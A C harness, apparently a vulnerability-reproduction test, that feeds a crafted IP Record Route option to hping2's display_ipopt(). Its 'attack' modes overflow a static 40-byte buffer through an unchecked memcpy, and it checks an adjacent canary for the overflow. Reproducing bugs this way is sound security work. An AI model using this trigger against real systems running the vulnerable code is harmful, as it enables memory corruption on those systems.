/* Harness for CVE-2026-136131: calls the verbatim pinned display_ipopt()
 * with a crafted IP Record Route option. No hping code is modified here. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#include "hping2.h"

void display_ipopt(char *buf);

/* Plain-build adjacency canary. Its distance from display_ipopt.o's static
 * old_rr[40] is passed as -DCANARY_GAP by run.sh (nm -n of the objects). */
#ifndef CANARY_GAP
#define CANARY_GAP 40
#endif
unsigned char canary[512];

/* Matches wait_packet()'s packet buffer: IP_MAX_SIZE+linkhdr_size bytes. */
static unsigned char packet[256];
static const char marker[] = "MISHE-OO";

static void craft(unsigned char optptr)
{
	struct myiphdr *ip;

	memset(packet, 0, sizeof(packet));
	ip = (struct myiphdr *)packet;
	ip->ihl = 15;          /* 60-byte IP header: 40 option bytes */
	ip->version = 4;
	ip->tot_len = htons(60);
	ip->ttl = 64;
	ip->protocol = 1;
	ip->saddr = inet_addr("127.0.0.1");
	ip->daddr = inet_addr("127.0.0.1");

	/* IPOPT_RR: length byte 255, pointer byte supplied by the caller.
	 * display_ipopt() clamps i to j, subtracts IPOPT_MINOFF (4), then
	 * memcpy(old_rr, cp, i) with no bound against MAX_IPOPTLEN (40). */
	packet[20] = IPOPT_RR;
	packet[21] = 255;
	packet[22] = optptr;
	for (size_t k = 23; k < sizeof(packet); k++)
		packet[k] = (unsigned char)marker[(k - 23) % 8];
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "attack";
	unsigned char optptr;

	if (!strcmp(mode, "attack"))
		optptr = 0x48;             /* i = 72 - 4 = 68 (> 40) */
	else if (!strcmp(mode, "attack2"))
		optptr = 0x5a;             /* i = 90 - 4 = 86 (> 40) */
	else if (!strcmp(mode, "safe"))
		optptr = 0x08;             /* i = 8 - 4 = 4, in bounds */
	else if (!strcmp(mode, "safe-zero"))
		optptr = 0x04;             /* i = 0, skipped by continue */
	else {
		fprintf(stderr, "unknown mode %s\n", mode);
		return 2;
	}

	craft(optptr);
	printf("MODE=%s OPTLEN=255 OPTPTR=0x%02x CANARY_GAP=%d\n",
	       mode, optptr, CANARY_GAP);

	display_ipopt((char *)packet);

	/* Expected bytes in canary[] after the plain (non-ASan) overflow:
	 * old_rr[n] = packet[22+n]; canary[k] = old_rr[CANARY_GAP+k]. */
	printf("CANARY:");
	for (int k = 0; k < 32; k++)
		printf(" %02x", canary[k]);
	printf("\nEXPECT:");
	for (int k = 0; k < 32; k++) {
		int n = CANARY_GAP + k;
		printf(" %02x", (n >= 40 && n < (optptr - 4)) ?
		       packet[22 + n] : canary[k]);
	}
	printf("\n");
	return 0;
}
